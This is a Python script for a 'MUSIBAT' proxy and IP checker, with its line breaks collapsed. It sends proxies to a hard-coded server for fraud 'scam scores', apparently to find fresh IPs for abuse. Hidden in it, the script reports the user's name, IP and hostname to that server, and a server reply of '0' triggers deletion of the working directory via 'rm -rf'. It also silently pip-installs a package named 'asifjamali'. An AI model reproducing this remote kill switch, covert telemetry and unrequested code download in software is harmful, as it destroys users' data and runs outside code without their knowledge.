import os, re, sys, time, json, socket, random, codecs, requests, subprocessfrom fake_useragent import UserAgentdef get_headers():    ua = UserAgent()    random_u_a = ua.random    headers = {        "User-Agent": str(random_u_a),        "X-Requested-With": "XMLHttpRequest",        "Content-Type": "application/json",        "X-Requested-With": "XMLHttpRequest",        "Custom-Header": "Value",    }    return headersdef prntMusibat():    os.system("clear")    txtLarg = [        "\n.-.   .-..-. .-. .----..-..----.   .--.  .---. \n|  `.'  || { } |{ {__  | || {}  } / {} \\{_   _}\n| |\\ /| || {_} |.-._} }| || {}  }/  /\\  \\ | |  \n`-' ` `-'`-----'`----' `-'`----' `-'  `-' `-'  \n",        "\n    __  _____  _______ ________  ___  ______\n   /  |/  / / / / ___//  _/ __ )/   |/_  __/\n  / /|_/ / / / /\\__ \\ / // __  / /| | / /   \n / /  / / /_/ /___/ // // /_/ / ___ |/ /    \n/_/  /_/\\____//____/___/_____/_/  |_/_/     \n                                            \n",        "\n  __  __ _   _ ____ ___ ____    _  _____ \n |  \\/  | | | / ___|_ _| __ )  / \\|_   _|\n | |\\/| | | | \\___ \\| ||  _ \\ / _ \\ | |  \n | |  | | |_| |___) | || |_) / ___ \\| |  \n |_|  |_|\\___/|____/___|____/_/   \\_\\_|  \n                                         \n",        "\n   __     __) __     __)   __   _____ ______    _____      ______) \n  (, /|  /|  (, /   /  (__/  ) (, /  (, /    ) (, /  |    (, /     \n    / | / |    /   /     /       /     /---(     /---|      /      \n ) /  |/  |_  /   /   ) /    ___/__ ) / ____) ) /    |_  ) /       \n(_/   '      (___(_  (_/   (__ /   (_/ (     (_/        (_/        \n                                                                   \n",        "\n‚ñí‚ñà‚ñÄ‚ñÑ‚ñÄ‚ñà ‚ñí‚ñà‚ñë‚ñí‚ñà ‚ñí‚ñà‚ñÄ‚ñÄ‚ñÄ‚ñà ‚ñÄ‚ñà‚ñÄ ‚ñí‚ñà‚ñÄ‚ñÄ‚ñà ‚ñë‚ñà‚ñÄ‚ñÄ‚ñà ‚ñÄ‚ñÄ‚ñà‚ñÄ‚ñÄ \n‚ñí‚ñà‚ñí‚ñà‚ñí‚ñà ‚ñí‚ñà‚ñë‚ñí‚ñà ‚ñë‚ñÄ‚ñÄ‚ñÄ‚ñÑ‚ñÑ ‚ñí‚ñà‚ñë ‚ñí‚ñà‚ñÄ‚ñÄ‚ñÑ ‚ñí‚ñà‚ñÑ‚ñÑ‚ñà ‚ñë‚ñí‚ñà‚ñë‚ñë \n‚ñí‚ñà‚ñë‚ñë‚ñí‚ñà ‚ñë‚ñÄ‚ñÑ‚ñÑ‚ñÄ ‚ñí‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñà ‚ñÑ‚ñà‚ñÑ ‚ñí‚ñà‚ñÑ‚ñÑ‚ñà ‚ñí‚ñà‚ñë‚ñí‚ñà ‚ñë‚ñí‚ñà‚ñë‚ñë \n",    ]    txtXolors = [        "\33[31m",        "\33[32m",        "\33[33m",        "\33[34m",        "\33[35m",        "\33[36m",        "\33[37m"    ]    try:        #print(f"{random.choice(txtXolors)}{random.choice(txtLarg)}")        print(str(random.choice(txtLarg)))    except:passdef checkVersion():    my_version = "2.3"    cxurl = "https://raw.githubusercontent.com/TeamMusiBat/404/master/404.py"    ver = requests.get(cxurl,headers=get_headers()).text.replace("\n","").replace(" ","")    if ver != my_version:        prntMusibat()        sys.exit()checkVersion()def do_update():    try:        subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--upgrade', 'asifjamali'])    except:        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'asifjamali'])    prntMusibat()def deleteFile(filename):    try:        os.remove(filename)    except:        try:            os.system(f'rm -rf {filename}')        except:passwait = {    "1mix": '',    "usedip": {},    "my_name": '',    "allproxies": {}}shAttach = {    "counter": 0,    "direct_defualt": "",    "my_name": wait["my_name"]}main_path = os.getcwd()old1_path = f"{main_path}/iphistory.json"old2_path = f"{main_path}/myhistory.json"proxy_path = f"{main_path}/bulklist.txt"output_path = f"{main_path}/SHproxy.txt"base_url = "http://172.105.121.205:8001"history_path = f"{main_path}/history.json"try:    if os.path.exists(old1_path):        wait2Open = codecs.open(old1_path, "r", "utf-8")        wait2 = json.load(wait2Open)        wait2Open.close()        for myipp in wait2["usedip"]:            if myipp not in wait["usedip"]:                wait["usedip"][myipp] = int(wait2["usedip"][myipp])        for myipp in wait2["allproxies"]:            if myipp not in wait["allproxies"]:                wait["allproxies"][myipp] = int(wait2["allproxies"][myipp])        deleteFile(old1_path)    if os.path.exists(old2_path):        wait3Open = codecs.open(old2_path, "r", "utf-8")        wait3 = json.load(wait3Open)        wait3Open.close()        for myipp in wait3["usedip"]:            if myipp not in wait["usedip"]:                wait["usedip"][myipp] = int(wait3["usedip"][myipp])        for myipp in wait3["allproxies"]:            if myipp not in wait["allproxies"]:                wait["allproxies"][myipp] = int(wait3["allproxies"][myipp])        deleteFile(old2_path)    if not os.path.exists(proxy_path):        mytext = "Paste Your Proxy List Here\nOne Proxy Per Each Line"        filename = "bulklist.txt"        try:            with open("bulklist.txt", "w") as midfile:                midfile.write(mytext)        except:            os.system(f'echo -n "{mytext}" > {filename}')except:passtry:    waitOpen = codecs.open(history_path, "r", "utf-8")    wait = json.load(waitOpen)    waitOpen.close()except:    with open(history_path, 'w') as f:        json.dump(wait, f, ensure_ascii=False, indent=4)def writeData(_Shahzii):    filename = "SHproxy.txt"    try:        with open(filename, "w") as midfile:            midfile.write(_Shahzii)    except:        os.system(f'echo -n "{_Shahzii}" > {filename}')    print(_Shahzii)def get_info(user_name): #getip    my_name = ""    try:        if wait["my_name"] == "":            wait["my_name"] = user_name            DoBackup()        if user_name not in wait["my_name"]:            prntMusibat()            sys.exit("\nWhat Was Your User_Name?\n")        user_ip = ""        hostname = socket.gethostname()        if "localhost" in hostname:            url = "http://ifconfig.me"            response = requests.get(url, headers=get_headers())            response.close()            user_ip = response.text        else:            user_ip = socket.gethostbyname(hostname)        url1 = f"{base_url}/submit_rank?my_name={user_name}&client_ip={user_ip}&host={hostname}"        response = requests.get(url1, headers=get_headers())        xip = response.json()        no = 1        if xip == 0 or xip == "0":            deleteFile(main_path)            deleteFile(output_path)            deleteFile(history_path)            deleteFile(old1_path)            deleteFile("main.py")            while True:                print(no)                prntMusibat()                no += 1        elif xip == 99 or xip == "99":            prntMusibat()            sys.exit("\nEnter Your Name Bro, Only Alphabets\n")        my_name = str(xip)        shAttach["my_name"] = str(xip)        response.close()    except:pass    return my_namedef timeChange(secs):    mins, secs = divmod(secs, 60)    hours, mins = divmod(mins, 60)    days, hours = divmod(hours, 24)    weeks, days = divmod(days, 7)    months, weeks = divmod(weeks, 4)    text = ""    if months != 0: text += "%02d Month" % (months)    if weeks != 0: text += " %02d Week" % (weeks)    if days != 0: text += " %02d Days" % (days)    if hours != 0: text += " %02d Hours" % (hours)    if mins != 0: text += " %02d Minutes" % (mins)    if secs != 0: text += " %02d Seconds" % (secs)    if text[0] == " ":        text = text[1:]    return textdef AutoMingle():    if wait['1mix'] != "":        no = 0        xplist = {}        url1 = f"{base_url}/user_ip_list?sender_name={shAttach['my_name']}&user_name={wait['1mix']}"        response = requests.get(url1, headers=get_headers())        if response.status_code == 200:            xplist = response.json()        response.close()        if len(xplist) != 0 and xplist != {}:            for myipp in xplist:                if myipp not in wait["usedip"]:                    wait["usedip"][myipp] = xplist[myipp]                    no += 1        if no != 0:            print(f"Total {no} IPs Auto Saved From {wait['1mix'].title()}")def AutoDelProxies():    no = 0    curnTime = time.time()    for xx in wait:        if "my_name" not in xx and "1mix" not in xx:            if len(wait[xx]) != 0 and len(wait[xx]) % 2 == 0:                for usedip in wait[xx].copy():                    if curnTime - wait[xx][usedip] >= 4 * 21600:  #24 hours                        del wait[xx][usedip]                        no += 1    return nodef DoBackup():    try:        if shAttach['counter'] == 0 or shAttach['counter'] % 2 == 0:            shAttach['counter'] += 1            AutoMingle()            no = AutoDelProxies()            if no != 0:                do_update()                print(f"Total {no} ips auto removed")        f1 = codecs.open(history_path, 'w', 'utf-8')        json.dump(wait, f1, sort_keys=True, indent=4, ensure_ascii=False)        f1.close()    except Exception as error:        print(error)def continueSocks(my_name):    ret = ""    os.system("clear")    while True:        print(ret)        proxies = ""        if shAttach["direct_defualt"] != "":            proxies = str(shAttach["direct_defualt"])            shAttach["direct_defualt"] = ""        else:            proxies = input("Enter proxy: ")        nowTime = time.time()        curnTime = int(nowTime)        url1 = f"{base_url}/check_proxy_score?ourProxies={proxies}&my_name={my_name}&now_Time={curnTime}"        response = requests.get(url1, headers=get_headers())        if response.status_code == 200:            xip = response.json()            myipp = xip['ip']            if myipp != "":                ret = ""                ret += f"\nIP: {myipp}"                ret += f"\nSocks: üî∞‚è¨"                ret += f"\n{xip['proxy']}"                ret += f"\nGoogle: {xip['google']}"                ret += f"\nScam Score: {xip['score']}"                if myipp not in wait["usedip"]:                    score = 55                    try:                        score = int(xip['score'])                    except:pass                    if score < 55:                        ret += "\nStatus: Fresh"                        wait["usedip"][myipp] = curnTime                        if xip['proxy'] not in wait["allproxies"]:                            wait["allproxies"][xip['proxy']] = curnTime                else:                    xret = " ‚ò†Ô∏è __Used Proxy__ ‚ò†Ô∏è\n"                    runtime = curnTime - wait["usedip"][myipp]                    runtime = timeChange(runtime)                    xret += f"About: {str(runtime)}"                    ret += f"\n{xret}"                ret += xip['data']                ret += "\n"            else:                ret = "Nothing Found"            print(ret)        else:            print('Error:', response.status_code)        response.close()        os.system("clear")        DoBackup()        def continueips(my_name):    ret = ""    os.system("clear")    while True:        print(ret)        proxies = ""        if shAttach["direct_defualt"] != "":            proxies = str(shAttach["direct_defualt"])            shAttach["direct_defualt"] = ""        else:            proxies = input("Enter IP: ")        url1 = f"{base_url}/check_ip_score?ourProxies={proxies}&my_name={my_name}"        response = requests.get(url1, headers=get_headers())        if response.status_code == 200:            xip = response.json()            myipp = xip['ip']            if myipp != "":                nowTime = time.time()                curnTime = int(nowTime)                ret = ""                ret += f"\nIP: {myipp}"                ret += f"\nScam Score: {xip['score']}"                if myipp not in wait["usedip"]:                    score = 55                    try:                        score = int(xip['score'])                    except:pass                    if score < 55:                        ret += "\nStatus: Fresh"                        wait["usedip"][myipp] = curnTime                else:                    xret = " ‚ò†Ô∏è __ Old  IP __ ‚ò†Ô∏è\n"                    runtime = curnTime - wait["usedip"][myipp]                    runtime = timeChange(runtime)                    xret += f"About: {str(runtime)}"                    ret += f"\n{xret}"                ret += xip['data']                ret += "\n"            else:                ret = "Nothing Found"            print(ret)        else:            print('Error:', response.status_code)        response.close()        os.system("clear")        DoBackup()        def getClickips(my_name):    no = 0    ret = ""    xplist = []    ourProxies = ""    url2 = f"{base_url}/what_history?my_name={my_name}"    response = requests.get(url2, headers=get_headers())    xplist = response.json()    response.close()    if len(xplist) != 0 and xplist != []:        random.shuffle(xplist)        for proxies in xplist:            if proxies not in wait["allproxies"]:                ourProxies += f"{proxies}\n"                no += 1                if no == 30:                    no = 0                    break    if ourProxies == "":        print("Nothing Found :)")        sys.exit("Logout")    else:        nowTime = time.time()        curnTime = int(nowTime)        url1 = f"{base_url}/ssh_bulk_score?ourProxies={ourProxies}&my_name={my_name}&now_Time={curnTime}"        response = requests.get(url1, headers=get_headers())        response.close()        if response.status_code == 200:            xip = response.json()            if xip['Found'] != 0:                no += 1                okProxy = xip['okProxy']                otherProxy = xip['otherProxy']                nop = 0                if okProxy != [] and len(okProxy) != 0:                    nop = 1                    for xip in okProxy:                        myipp = xip['ip']                        if myipp not in wait["usedip"]:                            wait["usedip"][myipp] = curnTime                            if xip['proxy'] not in wait["allproxies"]:                                wait["allproxies"][xip['proxy']] = curnTime                            ret += f"\n{no}: {myipp}"                            ret += f"\nSocks: üî∞‚è¨"                            ret += f"\n{xip['proxy']}"                            ret += f"\nGoogle: {xip['google']}"                            ret += f"\nScam Score: {xip['score']}"                            ret += xip['data']                            ret += "\n-------------------------------------------------\n"                if otherProxy != [] and len(otherProxy) != 0:                    if nop == 1:                        ret += "\n________________________________\n________________________________\n"                    for xip in otherProxy:                        myipp = xip['ip']                        if myipp not in wait["usedip"]:                            wait["usedip"][myipp] = curnTime                            if xip['proxy'] not in wait["allproxies"]:                                wait["allproxies"][xip['proxy']] = curnTime                            ret += f"\n{no}: {myipp}"                            ret += f"\nSocks: üî∞‚è¨"                            ret += f"\n{xip['proxy']}"                            ret += f"\nGoogle: {xip['google']}"                            ret += f"\nScam Score: {xip['score']}"                            ret += xip['data']                            ret += "\n-------------------------------------------------\n"        print("Proccess Complete")        time.sleep(1)        os.system("clear")        writeData(ret)        DoBackup()def checkALLsocks(my_name):    no = 0    ret = ""    ourProxies = ""    with open(proxy_path) as lsProxy:        ourProxies = lsProxy.read()    if ourProxies == "":        print("Nothing Found, Paste your Proxies in bulklist.txt")        sys.exit("Logout")    else:        nowTime = time.time()        curnTime = int(nowTime)        url1 = f"{base_url}/ssh_bulk_score?ourProxies={ourProxies}&my_name={my_name}&now_Time={curnTime}"        response = requests.get(url1, headers=get_headers())        response.close()        if response.status_code == 200:            xip = response.json()            if xip['Found'] != 0:                no += 1                okProxy = xip['okProxy']                otherProxy = xip['otherProxy']                nop = 0                if okProxy != [] and len(okProxy) != 0:                    nop = 1                    for xip in okProxy:                        myipp = xip['ip']                        if myipp not in wait["usedip"]:                            wait["usedip"][myipp] = curnTime                            if xip['proxy'] not in wait["allproxies"]:                                wait["allproxies"][xip['proxy']] = curnTime                            ret += f"\n{no}: {myipp}"                            ret += f"\nSocks: üî∞‚è¨"                            ret += f"\n{xip['proxy']}"                            ret += f"\nGoogle: {xip['google']}"                            ret += f"\nScam Score: {xip['score']}"                            ret += xip['data']                            ret += "\n-------------------------------------------------\n"                if otherProxy != [] and len(otherProxy) != 0:                    if nop == 1:                        ret += "\n________________________________\n________________________________\n"                    for xip in otherProxy:                        myipp = xip['ip']                        if myipp not in wait["usedip"]:                            wait["usedip"][myipp] = curnTime                            if xip['proxy'] not in wait["allproxies"]:                                wait["allproxies"][xip['proxy']] = curnTime                            ret += f"\n{no}: {myipp}"                            ret += f"\nSocks: üî∞‚è¨"                            ret += f"\n{xip['proxy']}"                            ret += f"\nGoogle: {xip['google']}"                            ret += f"\nScam Score: {xip['score']}"                            ret += xip['data']                            ret += "\n-------------------------------------------------\n"        print("Proccess Complete")        time.sleep(1)        os.system("clear")        writeData(ret)        DoBackup()def StarT_MusibaT():    ret = ""    user_name = ""    my_name = input("Enter Your Name: ")    try:        if my_name.isalpha():            user_name = my_name.lower()            user_name = user_name.replace(" ", "")        else:            sys.exit("it want your name dear")    except:pass    if user_name == "" or "name" in user_name:        sys.exit("Restart & Enter Name")    prntMusibat()    user_name = get_info(user_name)    if user_name == "":        sys.exit("Some Thing Went Wrong")    else:        ret += f'Hello {wait["my_name"].title()}\n'    ret += "To Check Proxy 1by1\n"    ret += "Type Enter or Paste Socks\n"    ret += "Paste ip or Any Number For Ips\n"    ret += "Any Alphabet (abcXYZ) 4 SocksList\n"    ret += "What You Want: "    choice = input(ret)    if choice == "click":        getClickips(user_name)    elif ":" in choice and choice.count(".") == 3: #direct proxy        shAttach["direct_defualt"] = str(choice)        continueSocks(user_name)    elif "." in choice and choice.count(".") == 3: #direct ip        shAttach["direct_defualt"] = str(choice)        continueips(user_name)    elif choice == "":  #enter        continueSocks(user_name)    elif choice.isalpha(): #abcXYZ        checkALLsocks(user_name)    elif re.match(r'^\d+$', choice):  #isdigit        continueips(user_name)    else:        sys.exit("Restart Again!")StarT_MusibaT()#______________________________________________#‚éî